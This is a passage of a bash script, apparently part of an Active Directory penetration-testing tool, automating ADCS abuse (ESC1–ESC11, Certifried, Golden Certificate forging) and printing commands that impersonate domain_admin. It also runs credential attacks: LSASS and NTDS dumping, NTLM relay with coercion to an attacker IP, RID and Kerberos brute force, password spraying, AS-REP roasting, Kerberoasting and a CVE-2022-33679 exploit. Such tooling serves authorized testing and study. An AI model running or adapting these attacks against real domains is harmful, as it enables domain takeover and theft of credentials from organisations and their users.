        fi
    fi
    adcs_vuln_parse | tee "${output_dir}/Exploitation/ADCS_exploitation_steps_${dc_domain}.txt"
    echo -e ""
}

adcs_vuln_parse() {
    ne_adcs_enum
    esc1_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC1" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc1_vuln ]]; then
        echo -e "${GREEN}[+] Templates vulnerable to ESC1 potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc1_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096"
            echo -e "${CYAN}2. Authenticate using pfx of domain_admin or DC:${NC}"
            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc2_3_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select ((."[!] Vulnerabilities"."ESC2" or ."[!] Vulnerabilities"."ESC3") and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc2_3_vuln ]]; then
        echo -e "${GREEN}[+] Templates vulnerable to ESC2 or ESC3 potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc2_3_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template ${vulntemp} -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\domain_admin -pfx ${user}.pfx -dc-ip ${dc_ip}"
            echo -e "${CYAN}3. Authenticate using pfx of domain_admin:${NC}"
            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc4_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC4" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc4_vuln ]]; then
        echo -e "${GREEN}[+] Templates vulnerable to ESC4 potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc4_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
            echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json"
            echo -e "${CYAN}4. Authenticate using pfx of domain_admin or DC:${NC}"
            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc6_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC6") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc6_vuln ]]; then
        echo -e "${GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulnca in $esc6_vuln; do
            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template User -upn domain_admin@${dc_domain}"
            echo -e "${CYAN}2. Authenticate using pfx of domain_admin:${NC}"
            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc7_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC7") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc7_vuln ]]; then
        echo -e "${GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulnca in $esc7_vuln; do
            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
            echo -e "${CYAN}1. Add a new officer:${NC}"
            echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -add-officer ${user} -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
            echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -enable-template SubCA -dc-ip ${dc_ip}"
            echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
            echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -issue-request <request_ID> -dc-ip ${dc_ip}"
            echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -retrieve <request_ID> -dc-ip ${dc_ip}"
            echo -e "${CYAN}6. Authenticate using pfx of domain_admin:${NC}"
            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc8_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC8") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc8_vuln ]]; then
        echo -e "${GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulnca in $esc8_vuln; do
            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
            echo -e "${CYAN}1. Start the relay server:${NC}"
            echo -e "${certipy} relay -target http://${dc_ip}"
            echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l $attacker_IP --dc-ip $dc_ip"
        done
    fi

    esc9_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC9" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc9_vuln ]]; then
        echo -e "${GREEN}[+] ESC9 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulntemp in $esc9_vuln; do
            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
            echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Change userPrincipalName of second_user to domain_admin:${NC}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target < ${pki_servers} > -ca < ${pki_cas} > -template ${vulntemp} -dc-ip ${dc_ip}"
            echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${CYAN}5. Authenticate using pfx of domain_admin:${NC}"
            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
        done
    fi

    esc10_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC10") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc10_vuln ]]; then
        echo -e "${GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulnca in $esc10_vuln; do
            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
            echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}"
            echo -e "${CYAN}2. Change userPrincipalName of user2 to domain_admin or DC:${NC}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca $vulnca -template User -dc-ip ${dc_ip}"
            echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
            echo -e "${CYAN}5. Authenticate using pfx of domain_admin or DC:${NC}"
            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
            echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -dc-ip ${dc_ip}"g
        done
    fi

    esc11_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC11") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
    if [[ -n $esc11_vuln ]]; then
        echo -e "${GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:${NC}"
        for vulnca in $esc11_vuln; do
            echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
            echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
            echo -e "ntlmrelayx.py -t rpc://< ${pki_servers} > -rpc-mode ICPR -icpr-ca-name $vulnca -smb2support"
            echo -e "OR"
            echo -e "${certipy} relay -target rpc://< ${pki_servers} > -ca ${vulnca}"
            echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
        done
    fi
}

certifried_check() {
    if [[ ! -f "${certipy}" ]]; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        echo -e "${BLUE}[*] Certifried Vulnerability Check${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
        else
            ne_adcs_enum
            current_dir=$(pwd)
            cd "${output_dir}/Credentials" || exit
            i=0
            for pki_server in $pki_servers; do
                i=$((i + 1))
                pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca ${pki_ca} -template User" 2>&1 | tee "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt"
                if ! grep -q "Certificate object SID is" "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt" && ! grep -q "error" "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt"; then
                    echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                    echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                    echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                    echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca ${pki_ca} -template Machine" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                    echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                    echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                    echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME " | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                fi
            done
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

certipy_ldapshell() {
    if [[ ! -f "${certipy}" ]]; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        if [ "${cert_bool}" == true ]; then
            echo -e "${BLUE}[*] Launching LDAP shell via Schannel using Certipy ${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -ldap-shell" 2>&1 | tee "${output_dir}/ADCS/certipy_ldapshell_output_${dc_domain}.txt"
        else
            echo -e "${PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy${NC}"
        fi
    fi
    echo -e ""
}

certipy_ca_dump() {
    if [[ ! -f "${certipy}" ]]; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        echo -e "${BLUE}[*] Certipy extract CAs and forge Golden Certificate${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
        else
            ne_adcs_enum
            domain_DN=$(fqdn_to_ldap_dn "${dc_domain}")
            current_dir=$(pwd)
            cd "${output_dir}/Credentials" || exit
            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
            i=0
            for pki_server in $pki_servers; do
                i=$((i + 1))
                pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                run_command "${certipy} ca ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -backup" | tee -a "${output_dir}/ADCS/certipy_ca_backup_output_${dc_domain}.txt"
                run_command "${certipy} forge -ca-pfx ${output_dir}/Credentials/${pki_ca}.pfx -upn Administrator@${dc_domain} -subject CN=Administrator,CN=Users,$domain_DN -out Administrator_${pki_ca}_${dc_domain}.pfx" | tee -a "${output_dir}/ADCS/certipy_forge_output_${dc_domain}.txt"
                if [[ -f "${output_dir}/Credentials/Administrator_${pki_ca}_${dc_domain}.pfx" ]]; then
                    echo -e "${GREEN}[+] Golden Certificate successfully generated!${NC}"
                    echo -e "${CYAN}Authenticate using pfx of Administrator:${NC}"
                    echo -e "${certipy} auth -pfx ${output_dir}/Credentials/Administrator_${pki_ca}_${dc_domain}.pfx -dc-ip ${dc_ip} [-ldap-shell]"
                fi
            done
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

masky_dump() {
    echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        ne_adcs_enum
        if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
            if [ "${kerb_bool}" == true ]; then
                echo -e "${PURPLE}[-] Targeting DCs only${NC}"
                curr_targets="Domain Controllers"
            fi
            smb_scan
            i=0
            for pki_server in $pki_servers; do
                i=$((i + 1))
                pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                while IFS= read -r i; do
                    echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
                    run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M masky -o CA=${pki_server}\\${pki_ca} --log ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt" 2>&1
                done <"${servers_smb_list}"
            done
        else
            echo -e "${PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}"
        fi
    fi
    echo -e ""
}

certsync_ntds_dump() {
    if [ ! -f "${certsync}" ]; then
        echo -e "${RED}[-] Please verify the installation of certsync${NC}"
    else
        echo -e "${BLUE}[*] Dumping NTDS using certsync${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] certsync requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
            run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${output_dir}/Credentials/certsync_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

###### bruteforce: Brute Force attacks
ridbrute_attack() {
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt"
        run_command "${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt"
        run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt"
        #Parsing user lists
        grep "SidTypeUser" "${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt" | cut -d "\\" -f 2 | sort -u | sed "s/ (SidTypeUser)//g" >"${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt" 2>&1
        count=$(wc -l "${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt" | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RID Brute Force${NC}"
        parse_users
    else
        echo -e "${PURPLE}[-] Null session RID brute force skipped (credentials provided)${NC}"
    fi
    echo -e ""
}

kerbrute_enum() {
    if [ "${nullsess_bool}" == true ]; then
        if [ ! -f "${kerbrute}" ]; then
            echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
        else
            echo -e "${BLUE}[*] kerbrute User Enumeration (Null session)${NC}"
            echo -e "${YELLOW}[i] Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}"
            run_command "${kerbrute} userenum ${user_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" >>"${output_dir}/BruteForce/kerbrute_user_output_${dc_domain}.txt"
            grep "VALID" "${output_dir}/BruteForce/kerbrute_user_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt" 2>&1
            if [ -s "${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt" ]; then
                echo -e "${GREEN}[+] Printing valid accounts...${NC}"
                /bin/cat "${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt" 2>/dev/null
                parse_users
            fi
        fi
    else
        echo -e "${PURPLE}[-] Kerbrute null session enumeration skipped (credentials provided)${NC}"
    fi
    echo -e ""
}

userpass_ne_check() {
    parse_users
    if [ ! -s "${users_list}" ]; then
        echo -e "${PURPLE}[-] No users found! Please re-run users enumeration and try again..${NC}"
    else
        echo -e "${BLUE}[*] netexec User=Pass Check (Noisy!)${NC}"
        echo -e "${YELLOW}[i] Finding users with Password = username using netexec. This may take a while...${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} -u ${users_list} -p ${users_list} --no-bruteforce --continue-on-success" >"${output_dir}/BruteForce/ne_userpass_output_${dc_domain}.txt"
        grep "\[+\]" "${output_dir}/BruteForce/ne_userpass_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >"${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt"
        if [ -s "${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt" ]; then
            echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
            /bin/cat "${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt" 2>/dev/null
        else
            echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
        fi
    fi
    echo -e ""
}

userpass_kerbrute_check() {
    if [ ! -f "${kerbrute}" ]; then
        echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
    else
        parse_users
        user_pass_wordlist="${output_dir}/BruteForce/kerbrute_userpass_wordlist_${dc_domain}.txt"

        echo -e "${BLUE}[*] kerbrute User=Pass Check (Noisy!)${NC}"
        if [ -s "${users_list}" ]; then
            echo -e "${YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...${NC}"
            /bin/rm "${user_pass_wordlist}" 2>/dev/null
            while IFS= read -r i; do
                echo -e "${i}:${i}" >>"${user_pass_wordlist}"
            done <"${users_list}"
            sort -uf "${user_pass_wordlist}" -o "${user_pass_wordlist}"
            run_command "${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" >"${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt"
            grep "VALID" "${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt"
            if [ -s "${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt" ]; then
                echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
                /bin/cat "${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt" 2>/dev/null
            else
                echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
            fi
        else
            echo -e "${PURPLE}[-] No known users found. Run user enumeraton and try again.${NC}"
        fi
    fi
    echo -e ""
}

pre2k_check() {
    if [ ! -f "${pre2k}" ]; then
        echo -e "${RED}[-] Please verify the installation of pre2k${NC}"
    else
        echo -e "${BLUE}[*] Pre2k authentication check (Noisy!)${NC}"
        pre2k_outputfile="${output_dir}/BruteForce/pre2k_outputfile_${dc_domain}.txt"
        if [ "${nullsess_bool}" == true ]; then
            if [ ! -s "${servers_hostname_list}" ]; then
                echo -e "${PURPLE}[-] No computers found! Please re-run computers enumeration and try again..${NC}"
            else
                run_command "${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${servers_hostname_list} -outputfile ${pre2k_outputfile}" | tee "${output_dir}/BruteForce/pre2k_output_${dc_domain}.txt"
            fi
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
            run_command "${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip} -outputfile ${pre2k_outputfile} ${ldaps_param}" | tee "${output_dir}/BruteForce/pre2k_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

ldapnomnom_enum() {
    if [ "${nullsess_bool}" == true ]; then
        if [ ! -f "${ldapnomnom}" ]; then
            echo -e "${RED}[-] Please verify the location of ldapnomnom${NC}"
        else
            echo -e "${BLUE}[*] ldapnomnom User Enumeration (Null session)${NC}"
            echo -e "${YELLOW}[i] Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--tlsmode tls --port 636"; else ldaps_param=""; fi
            run_command "${ldapnomnom} --server ${dc_ip} --dnsdomain ${dc_domain} ${ldaps_param} --maxservers 4 --parallel 8 --input ${user_wordlist} --output ${output_dir}/DomainRecon/Users/users_list_ldapnomnom_${dc_domain}.txt" | tee -a "${output_dir}/BruteForce/ldapnomnom_user_output_${dc_domain}.txt"
            if [ -s "${output_dir}/DomainRecon/Users/users_list_ldapnomnom_${dc_domain}.txt" ]; then
                echo -e ""
                echo -e "${GREEN}[+] Printing valid accounts...${NC}"
                sort -uf "${output_dir}/DomainRecon/Users/users_list_ldapnomnom_${dc_domain}.txt" 2>/dev/null
                parse_users
            fi
        fi
    else
        echo -e "${PURPLE}[-] ldapnomnom null session enumeration skipped (credentials provided)${NC}"
    fi
    echo -e ""
}

###### kerberos: Kerberos attacks
asrep_attack() {
    if [ ! -f "${impacket_GetNPUsers}" ]; then
        echo -e "${RED}[-] GetNPUsers.py not found! Please verify the installation of impacket${NC}"
    else
        parse_users
        echo -e "${BLUE}[*] AS REP Roasting Attack${NC}"
        if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ]; then
            if [ -s "${users_list}" ]; then
                users_scan_list=${users_list}
            else
                echo -e "${YELLOW}[i] No credentials for target domain provided. Using $user_wordlist wordlist...${NC}"
                users_scan_list=${user_wordlist}
            fi
            run_command "${impacket_GetNPUsers} ${dc_domain}/ -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}" >"${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt"
            grep "krb5asrep" "${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt" | sed "s/\$krb5asrep\$23\$//" >"${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" 2>&1
        else
            run_command "${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}"
            run_command "${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}" >"${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt"
            #${netexec} ${ne_verbose} smb ${servers_smb_list} "${argument_ne}" --asreproast --log ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt" 2>&1
        fi
        if grep -q 'error' "${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt"; then
            echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
        else
            grep "krb5asrep" "${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt" | sed "s/\$krb5asrep\$23\$//" | tee "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" 2>&1
            if [ -s "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" ]; then
                echo -e "${GREEN}[+] ASREP-roastable accounts found!${NC}"
            else
                echo -e "${PURPLE}[-] No ASREP-roastable accounts found${NC}"
            fi
        fi
    fi
    echo -e ""
}

asreprc4_attack() {
    if [ ! -f "${CVE202233679}" ]; then
        echo -e "${RED}[-] Please verify the location of CVE-2022-33679.py${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${BLUE}[*] CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)${NC}"
            if [ ! -f "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" ]; then
                asrep_attack
            fi
            asrep_user=$(cut -d "@" -f 1 "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" | head -n 1)
            if [ ! "${asrep_user}" == "" ]; then
                current_dir=$(pwd)
                cd "${output_dir}/Credentials" || exit
                run_command "${python3} ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}" 2>&1 | tee "${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt"
                cd "${current_dir}" || exit
            else
                echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. If ASREProastable users exist, re-run ASREPRoast attack and try again.${NC}"
            fi
        else
            echo -e "${PURPLE}[-] CVE-2022-33679 skipped (credentials provided)${NC}"
        fi
    fi
    echo -e ""
}

kerberoast_attack() {
    if [ ! -f "${impacket_GetUserSPNs}" ]; then
        echo -e "${RED}[-] GetUserSPNs.py not found! Please verify the installation of impacket${NC}"
    else
        if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ]; then
            parse_users
            echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
            asrep_user=$(cut -d "@" -f 1 "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" | head -n 1)
            if [ ! "${asrep_user}" == "" ]; then
                run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${dc_domain}" >"${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt"
